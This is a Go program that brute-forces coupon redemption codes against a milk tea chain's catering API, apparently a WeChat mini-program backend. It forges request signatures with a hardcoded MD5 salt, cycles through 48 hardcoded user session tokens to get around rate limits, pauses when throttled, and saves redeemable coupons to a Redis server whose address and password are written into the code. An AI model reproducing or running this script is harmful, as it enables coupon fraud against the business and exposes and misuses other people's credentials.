package main

import (
	"bytes"
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"github.com/go-redis/redis"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"strconv"
	"time"
)

type Resp struct {
	Data struct {
		RedeemCoupons []struct {
			Expire string `json:"expire"`
			Name   string `json:"name"`
			ID     string `json:"id"`
		} `json:"redeemCoupons"`
		ReceivedStateText string `json:"receivedStateText"`
	} `json:"data"`
	Message string `json:"message"`
}

var (
	tokenList []string = []string{
		"9UJn6_H1gRNSuv3LFqEMXERh6M4Youf83s7vYC0KfGCDuoEw2-Gc1x86NNyjdks3",
		"xH3k6u97bzMDAZq5kfd7Iqav798qDKbhGviFBY9mJnQiyHpd3h38aDNmJXk4h8yx",
		"AL0jnu4XfMWVvD4dP14i97pWLu6GKW6umCM2RW0OLOOdcGNX6IORYf_5S0IGmo2S",
		"KAgTTP6NgABe31HdiBKbrJjSlmaToluJRXwcNMN071F1gWG9gS2fDA-idhtv95OF",
		"AU-cwpP1ukzSE_lnOPyz90s9P77TPIXGrJSxRXX0CZ2VZHYp3-GtUClWc2w-rswc",
		"DRiQ4fgj5FZU7CnPFQ0-Q6FLnAQyI3KvhNc9gvKhXBMAap_FhSygORrDhpz0gNxl",
		"x-Ca-XeiZ45OM6rd2CXn5Vpch3Jsw8TYfpJIja9bZ5Hu9iqq0LDE5UQC1skffLyd",
		"Dkq-1hPbKnccXUYcPc6giPMFkNXB1XZlmt3uZTjQ5WOJVQDmdg0AuBAW5lnJZM5W",
		"tNXSTbLT7opdQRqGRDLUYMxYOveNgEiUyszwYJxpFK1VVJoCdvbW9CI6TZBxNC_8",
		"rAyjSyDMCvNFQlfEhrM_HuPRtCWKwdlzLkeE2KpJ7wdlYypWjoXKY-HCaQR0eCkq",
		"AMfbesMGWIkmJDHWmucppldtNLLlZ8Gnj5mNYHJAdcfJ0krv8WbD9pVdy7-Xb3nI",
		"YUQ7K9skpO_ycw8o1Vy64lDkb3W_P9M51ppwTfveaIdcMy5tYTyVtd3nRxVxSZBg",
		"ti0WVYIG9hiWCrMircejvYQ7dxLZQbr3gMzhWdYjL-OmGaUA-NPbnisdRzBAn5VX",
		"Q9mT8m-2G7jt7Q-31B0FwbUsc5jWI7i6QUiLh-J5fl7JPomuFq7by9XsJsv5zlpR",
		"G_a7zdPdSt7khgLtbl5qSEID-79lFPb_1T41KH-YP4PGM8dYFwFUdbpQjpFX7ert",
		"RzD_Im5l7wh2qRzpQFWz_Ec38wTRl4s7emGu1yKAZaL7iPYRCAYqQ9aoGMa9v8zx",
		"htSq_34WhfK48A8KCfHd-qPNsBJxWkx1Cz0gnvi6_BgnyNi6HB632e1G-nY-lXNo",
		"Vs_JFuSlSiOLFQY3-lzg6dioEzt37cqEft-BJkISdUvBgaw6Bs7hRZjVcSjWVkJt",
		"htb6V5s8SmgVHEumnrXH0l9Plz0Y3-HyvgcqcAMn19ypHJL0SgWvpsNOGXGHVG65",
		"R3xTTu90nfTgJeB20GW5avUed986AjUH3fqL1MidJMXgg-_vPY82fSx7Ovpb0pNR",
		"0ArZTaytl02dzqVo3Nw6pVyMHibzPOXPwQzZvwnDXtwCbquxv_8Ejrb4kKF_G18Y",
		"uHKEw0nvcfNMLLZIQAypGOIgEDFGvCXv4uALw0jQuI2y-pbCkpnEGtaQM0GJ4m7c",
		"uMlfJZwbBg9g5oQWiBaNfwQ0BShgaLGlkz2rHRPmQV1Fhv_nuH_U7xth_3qc-PQ1",
		"y0s7JMmhSd0N-N4Q1uAUpFEH_-Rl1mql0r0rysDnUL93IG0O1xILMVE4mX417XUE",
		"JJgZ_qXYczANnInlOp2WjkwrYdUGKiIsqUlBmwzdQMV1uVFYzDm-bQgWy1FZYOGd",
		"_gIiU-MTuQoGRS-I7G7w36FsSfIgkIAZ8Xhvn4FohwvyIr6xMu5BEuZeg20a2JHZ",
		"IEfMy2TUTOQ_eNSPpKA6h65k7tdmyDzcREevTnffGuoO0UcIv0nMyMO1CtE4EFmP",
		"ewe_Tt_gWVHAN67C89S6vmDBaWnpfxZLfw9RqUSTXgVrh6CTM6jVGSNVhL34Qt1I",
		"fPZlKp1aOheYVYp25staDjkesBUmhrJJHgqATUAY_7NeZv2pH8SZ7vSErUp2WluV",
		"iW1DE3zx8NLAE6iQ4w7Ap4QsfPsj9gD79uYYoXpyjAQblIN5m-yx6p8NK4oJMQ3G",
		"_S8mVZCpZIA8EBiSdsxPBIOeOLeqiYuFbii7iZnoxt_DGvx_0JvgV_EpYkjtk9jZ",
		"SobDM4cDKIsQQBawwpmNdomcUw9G9q37i1QAQVy3INJTcY_Oc21EguJz2ICh7OXD",
		"dGj8i8TZACiz21zml2BInva_oH5Qf9uilbj76xr16Tgh9MovqKleVvF77CTRVf0H",
		"jppomtKbMyg-xm5xEg0ULVcrqqL107CpgS8atsK0Rae9JLHklAgiu87Xv5Xut4P9",
		"l50nTX54VUBnZnN46BRzEM2Qh6KXeL5WXz-xvp3QaiPo47Jo9jpDO37oqGsPIE5O",
		"0ut_XPBDH8kQ5BEPEn9GD15TbWxreFCNjKXkyqsIUj-q8P_rz4966zdjQB2FiCma",
		"8GslvWJwxkoNtiugpOogU3KGGgzXSAJYyjVS84uULslJ1pu2ySj5bvLLwKu8eqWt",
		"i8-DdHbb1xOQKTwuouR4QZkR2hWZ1109hY5-4qjGENkfg1Du7HRiK-R2EBRKNzIV",
		"x4U8VDLG-eFrKZdfe10lwGcZ1j7nh4t7_3zi54_PbONqwol_p5-8FZvbMUoKsXtr",
		"jfDpkEHqEmN4_VCZfVphlrFzPHYj9gwN23Tpu2T_rC1iEwVGAw5BxhB3y99AqgS3",
		"JFryq4FhZs9Ra2LjWtiVMJCh3f3iYwFNvXkNqwAdA2qeUfyDbqNBdeTqPIkTA_U4",
		"1e1T0CjnThgyt62dlw78UepF158EzgZWyjDXv_0TC0DH3D07QnnE222vrkCykA9H",
		"be_8vCp9N4D6PK4axX79JYdObUlAJi0mEkuaPWcLg3h9ESnBNh6BSkAi42JyfbqK",
		"N4Hh5MGpAWedzZOs-sy4hCCY2kQDgeTVOnNdWVVsvoWejKLIa4a7Mz3RGkJGMlru",
		"dE9dk9l4EbY53UdNUueXE-ko-DSc9yxfMC3msgXv65vQs-0FaXGUcQ31G96aAxs1",
		"REqrwTBIdxviU9ChgLqcIvQQFnFj0FgI7JdlRcwv_0hga8sns2xDqWfPKKOhNG-8",
		"mOd5Fo7_diF2TheEgwjvElr77a4IQRiSJma1AvkDFO3K3qTJZ-vMGG0RE9PCHjOq",
		"2U2LbbaGpGuoiVJyUUYOHN8zir9JJycH7K6Uqzbc_NgzQNCu2Z7kvgAkZwYnKndg"}
	pos    int = 0
	result Resp
	signer string
	i      int = 100
	card   string
	prer   string
)

func main() {

	rd := redisUtiler()

	temp, _ := rd.SMembers("HS").Result()

	for _, pre := range temp {
		prer = pre
		cnt := 0
		timeCnt := 0
		for i = 100; i <= 999; i++ {
			sign()
			card = prer + strconv.Itoa(i)
			scan(tokenList[pos], rd)

			// 轮训用户
			cnt++
			if cnt%10 == 0 {
				pos = (pos + 1) % 48
			}
			timeCnt++
			if timeCnt%480 == 0 {
				time.Sleep(60 * time.Second)
			}
		}
		time.Sleep(60 * time.Second)
	}

}

func sign() {
	signer = generatorMD5("qmaifb_code" + prer + strconv.Itoa(i))
}

func generatorMD5(code string) string {
	MD5 := md5.New()
	_, _ = io.WriteString(MD5, code)
	return hex.EncodeToString(MD5.Sum(nil))
}

func scan(t string, rd *redis.Client) {
	client := &http.Client{}

	req, _ := http.NewRequest("POST", "https://webapi.qmai.cn/web/catering/coupon/pre-redeem", bytes.NewReader([]byte("{\n  \"appid\" : \"wxd92a2d29f8022f40\",\n  \"signature\" : \""+signer+"\",\n  \"code\" : \""+card+"\"\n}")))
	req.Header.Set("Qm-User-Token", t)
	req.Header.Set("scene", "1089")
	req.Header.Set("content-type", "application/json")
	req.Header.Set("Qm-From", "wechat")
	req.Header.Set("store-id", "201424")
	req.Header.Set("Qm-From-Type", "catering")
	req.Header.Set("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.32(0x1800202d) NetType/4G Language/zh_CN")
	req.Header.Set("Referer", "https://servicewechat.com/wxd92a2d29f8022f40/217/page-frame.html")
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	resText, _ := ioutil.ReadAll(resp.Body)
	json.Unmarshal(resText, &result)
	if result.Message == "兑换频繁，请稍后再试" {
		fmt.Println("触发频繁控制 -> " + tokenList[pos])
		return
	}
	if result.Message == "登录超时" {
		fmt.Println("登录过期 -> " + tokenList[pos])
		return
	}
	if result.Message == "ok" {
		t := result.Data.RedeemCoupons[0]
		if result.Data.ReceivedStateText == "立即领取" {
			rd.SAdd("沪上奶茶", t.Name+"-"+t.Expire+"-"+result.Data.ReceivedStateText+"-"+prer+strconv.Itoa(i))
		}

	}
	log.Println("识别："+card, "结果：", string(resText))
}

func redisUtiler() *redis.Client {
	rdb := redis.NewClient(&redis.Options{Addr: "175.27.243.243:6379", Password: "213879", DB: 0})
	return rdb
}
